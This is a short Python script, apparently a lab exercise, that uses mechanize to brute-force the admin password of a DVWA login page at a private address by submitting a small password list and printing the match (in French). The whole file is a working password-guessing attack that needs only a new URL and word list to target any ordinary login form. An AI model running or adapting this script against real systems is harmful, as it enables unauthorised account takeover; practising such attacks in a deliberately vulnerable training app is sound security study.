import mechanize

passwords=['juju','test','admin','password']

br = mechanize.Browser()
br.open('http://192.168.100.7/dvwa/login.php')
for pwd in passwords :
    br.select_form(nr=0)
    br.form['username'] = 'admin'
    br.form['password'] = pwd
    br.submit()
    rep = br.response()
    if rep.geturl() == "http://192.168.100.7/dvwa/index.php":
        print ("Le mot de passe est :"+pwd)
        break